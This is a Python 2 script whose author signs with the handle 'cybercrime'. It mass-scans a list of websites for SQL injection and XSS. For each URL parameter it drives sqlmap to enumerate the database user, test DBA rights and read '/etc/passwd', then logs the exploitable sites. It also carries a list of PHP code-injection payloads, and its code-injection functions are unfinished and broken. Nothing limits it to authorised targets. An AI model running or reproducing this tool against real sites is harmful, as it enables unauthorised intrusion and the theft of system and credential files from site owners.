#!/usr/bin/env python
# -*- coding: UTF-8 -*-

#Author: Dmitry Radchenko. cybercrime@null.net
#Telegram: @cybercrime

#Description: The tool for mass simple web vulnerabilities checks.

from threading import Thread, Lock, currentThread, activeCount, BoundedSemaphore
from random import choice
import resource
import Queue
import time
import subprocess
import platform
import readline
import signal
import os
import re
import sys

scriptdir = os.path.dirname(os.path.realpath(__file__))
searchNum = 0
fileLength = 0
fileLengthThis = 0
subDomainsList = []
dorksList = []
lock = Lock()

vulnerableURLs = 0
pagesTested = 0

strictOutput = 0

linksCountInFile = 0

class bcolors:
	BlackOnIndigo = '\x1b[2;30;46m'
	BlackOnYellow = '\x1b[2;30;43m'
	BlackOnBlue = '\x1b[2;30;44m'
	BlackOnWhite = '\033[2;30;47m'
	HEADER = '\033[95m'
	OKBLUE = '\033[94m'
	OKGREEN = '\033[92m'
	OKCYAN = '\033[36m'
	RED = '\033[91m'
	WARNING = '\033[93m'
	Yellow='\033[33m'
	LightCyan='\033[96m'
	FAIL = '\033[91m'
	ENDC = '\033[0m'
	BOLD = '\033[1m'
	UNDERLINE = '\033[4m'

try:
	subprocess.check_output("git --version", shell=True)
except:
	print bcolors.OKGREEN+"git isn't installed. Installing..."+bcolors.ENDC
	subprocess.check_call("sudo apt-get install git", shell=True)
try:
	import requests
except:
	print bcolors.OKGREEN+"Python-Requests isn't installed. Installing..."+bcolors.ENDC
	subprocess.check_call("sudo pip install requests", shell=True)
	import requests

#Check DSXS installation
if not os.path.isfile(scriptdir+"/DSXS/dsxs.py"):
	print bcolors.OKGREEN+"Installing DSXS..."+bcolors.ENDC
	subprocess.check_call("git clone https://github.com/stamparm/DSXS.git "+scriptdir+"/DSXS", shell=True)

def sqliMass():
	global linksCountInFile
	whatScanMake = raw_input("1.* Массово сканировать на SQLi.\n"
							"2. Сканировать список ссылок на XSS.\n") or "1"
	sitesListPath = raw_input("Путь к файлу со списком сайтов (к примеру /path/urls.txt):\n")
	#checkMenu(sitesListPath)
	sitesList = []
	# Чистим путь к файлу, на случай если файл был перетащен в окно терминала.
	sitesListPath = sitesListPath.strip()
	if sitesListPath.endswith("'"): sitesListPath = sitesListPath[:-1]
	if sitesListPath.startswith("'"): sitesListPath = sitesListPath[1:]
	with open(sitesListPath, "r") as siteLink:
		for sLink in siteLink:
			sitesList.append(sLink.strip())
	linksCountInFile = len(sitesList)
	if linksCountInFile > 25:
		threadsSqliMass = raw_input("Ссылок больше 25-ти, сколько потоков одновременно использовать? (25*):") or "25"
		threadsSqliMass = int(threadsSqliMass)
	else:
		threadsSqliMass = len(sitesList)

	checkThreads = []

	print "\n---Start scanning links---\n"

	if whatScanMake is "1":
		for linkToScan in sitesList:
			checkThreads.append(Thread(target=startMassSQLi, args=(linkToScan,)))
	else:
		for linkToScan in sitesList:
			checkThreads.append(Thread(target=startMassXSS, args=(linkToScan,)))

	for thread in checkThreads:
		while True:
			if(int(activeCount()) <= threadsSqliMass):
				thread.start()
				break
			else:
				time.sleep(.1)
				continue
	for thread in checkThreads:
		sqliMassOutputMessages()
		thread.join()
	print ""
	#doneNext()

def startMassCodeInjection(linkToScan):
	requestSessions = requests.Session()
	headers = {"User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0"}
	payloads = ["phpinfo()", "phpinfo();//" \
			, "; phpinfo();" \
	 		, "\")); phpinfo();//", "\')); phpinfo();//" \
	 		, "\"); phpinfo();//",  "\'); phpinfo();//" \
	 		, "\"]); phpinfo();//", "\']); phpinfo();//" \
	 		, "\"]) OR phpinfo();//", "\']) OR phpinfo();//" \
	 		, "\") OR phpinfo();//", "\') OR phpinfo();//" \
	 		, "\" OR phpinfo();//", "\' OR phpinfo();//"]
	
	paramsData = []
	linkParams = linkToScan.split("?")[1].split("&")
	for everyParam in linkParams:
		paramValue = everyParam.split("=")[1]
		if paramValue is "":
			paramsData.append("someParam")
		else:
			paramsData.append(paramValue)

	for paramToTest in paramsData:
		for payload in payloads:
			urlToTest = linkToScan.replace(paramToTest, paramToTest+payload)

def MassCodeInjection():
	if('<h1 class="p">PHP Version' in response) and ('<a href="http://www.php.net/">' in response):
		asd = 1



def startMassXSS(linkToScan):
	global vulnerableURLs
	global pagesTested
	
	command = 'python '+ scriptdir +'/DSXS/dsxs.py -u "' + linkToScan + '"'

	p = subprocess.Popen(command, 
						stdout=subprocess.PIPE, 
						stderr=subprocess.STDOUT, 
						shell=True, 
						preexec_fn=os.setsid)
	command_output = iter(p.stdout.readline, b'')

	sqliMassOutputMessages()
	while True:
		for line in command_output:
			if "(i)" in line:
				sqliMassOutputMessages(line, linkToScan)
				vulnerableURLs += 1
		break

	pagesTested += 1
	sqliMassOutputMessages()

def startMassSQLi(linkToScan):
	global vulnerableURLs
	global pagesTested

	params = []
	resumed = 0

	getData = linkToScan.split("?")[1]
	paramsPairs = getData.split("&")
	for eachParamPair in paramsPairs:
		params.append(eachParamPair.split("=")[0])

	infoToSave = []

	for everyParam in params:

		repeatedTrigger = 0

		command = 'python '+ scriptdir +'/sqlmap/sqlmap.py -u "' + linkToScan + '" -p '+everyParam+' --random-agent -o --threads=10 --answers="extending provided level=N" --current-user --is-dba --file-read=\'/etc/passwd\' --batch'

		sqliMassOutputMessages()

		p = subprocess.Popen(command, 
							stdout=subprocess.PIPE, 
							stderr=subprocess.STDOUT, 
							shell=True, 
							preexec_fn=os.setsid)
		command_output = iter(p.stdout.readline, b'')

		while True:
			for line in command_output:
				if "[*] shutting down at" in line:
					os.killpg(os.getpgid(p.pid), signal.SIGTERM)
				if "and the remote file '/etc/passwd' have the same size" in line:
					sqliMassOutputMessages("FilePriv=Y", linkToScan)
					infoToSave.append("FilePriv=Y")
				if ("test shows that GET parameter" in line) and ("might be injectable" in line):
					sqliMassOutputMessages("Might", linkToScan)
				if "is vulnerable. Do you want to keep testing the others" in line:
					lock.acquire()
					vulnerableURLs += 1
					sqliMassOutputMessages("OK", linkToScan)
					with open(scriptdir + '/links-and-dirs/tmp/SQLiMassOK-tmp('+time.strftime("%Y-%m-%d--%H-%M-%S")+').txt', 'a') as tmpLinksFile:
						tmpLinksFile.write("OK => "+linkToScan+"\n")
					lock.release()
					infoToSave.append(time.strftime("%Y-%m-%d %H:%M:%S") + ", parameter: " + everyParam + " | " + linkToScan + "\n")
				if "current user is DBA:" in line:
					currentUserIs = line.split(":")[1]
					if "True" in currentUserIs:
						sqliMassOutputMessages("UserIsDBA", linkToScan)
						infoToSave.append("!Current user is DBA")
					else:
						infoToSave.append("user is NOT DBA")
						sqliMassOutputMessages("UserIsNOT", linkToScan)
				if "Type: stacked queries" in line:
					sqliMassOutputMessages("StackedQueries", linkToScan)
					infoToSave.append("STACKED QUERIES! \n")
				if "sqlmap resumed the following injection point(s) from stored session" in line:
					resumed = 1
					os.killpg(os.getpgid(p.pid), signal.SIGTERM)
					vulnerableURLs += 1
					break
				sqliMassOutputMessages()
			break

	pagesTested += 1

	if infoToSave:
		lock.acquire()
		with open(scriptdir + '/links-and-dirs/SQLiMassOK.txt', 'a') as vulnerableLinksFile:
			for everyLine in infoToSave:
				vulnerableLinksFile.write(everyLine+"\n")
		lock.release()
	else:
		if(resumed == 0):
			sqliMassOutputMessages("notVulnerable", linkToScan)
		else:
			sqliMassOutputMessages("resumed", linkToScan)


def sqliMassOutputMessages(message="", URL=""):
	global vulnerableURLs
	global pagesTested
	global linksCountInFile
	lock.acquire()
	sys.stdout.write("\033[K")
	if message is "OK":
		sys.stdout.write(bcolors.OKGREEN + "Vulnerable => " + URL + bcolors.ENDC + "\n")
	if message is "Might":
		sys.stdout.write(bcolors.OKBLUE + "Might be => " + URL + bcolors.ENDC + "\n")
	if message is "FilePriv=Y":
		sys.stdout.write(bcolors.BlackOnYellow + str(currentThread()) + "FilePriv=Y: " + URL + bcolors.ENDC + "\n")
	if message is "UserIsDBA":
		sys.stdout.write(bcolors.BlackOnBlue + "User is DBA => " + URL + bcolors.ENDC + "\n")
	if message is "StackedQueries":
		sys.stdout.write(bcolors.BlackOnYellow + "STACKED QUERIES! => " + URL + bcolors.ENDC + "\n")
	if message is "UserIsNOT":
		sys.stdout.write("User is NOT DBA => " + URL + "\n")
	if message is "resumed":
		sys.stdout.write(bcolors.OKCYAN + "Already, OK => " + URL + bcolors.ENDC + "\n")
	if message is "notVulnerable":
		sys.stdout.write("Not vulnerable " + URL + "\n")
	if ("(i)" in message) and ("XSS vulnerable" in message):
		sys.stdout.write(bcolors.BlackOnYellow + URL + bcolors.ENDC + " >> " + message + "\n")
	if ((int(activeCount())) > 0):
		sys.stdout.write(bcolors.BlackOnWhite + "Threads: " + str(int(activeCount())-1) + " | Pages tested: " + str(pagesTested) + "/" + str(linksCountInFile) + " | Vulnerable found: " + str(vulnerableURLs) + "\r" + bcolors.ENDC)
	sys.stdout.flush()
	lock.release()


sqliMass()